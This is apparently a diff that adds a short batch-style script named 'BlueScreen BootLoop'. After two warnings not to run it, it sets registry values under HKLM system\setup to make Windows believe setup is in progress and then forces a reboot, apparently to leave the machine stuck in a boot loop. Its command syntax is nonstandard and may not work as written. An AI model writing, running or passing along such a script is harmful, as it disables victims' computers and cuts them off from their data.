@@ -1,0 +1,15 @@
+- BlueScreen BootLoop
+
+
+
+echo DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU ARE DOING
+pause
+echo SECOND WARNING, DO NOT RUN THIS
+pause
+reg -w HKLM system\setup CmdLine sz         
+reg -w HKLM system\setup OOBEInProgress dword 1918
+reg -w HKLM system\setup RestartSetup dword 1918
+reg -w HKLM system\setup SetupPhase dword 1918
+reg -w HKLM system\setup SetupType dword 1918
+reg -w HKLM system\setup SystemSetupInProgress dword 1918
+poweroff -r 1
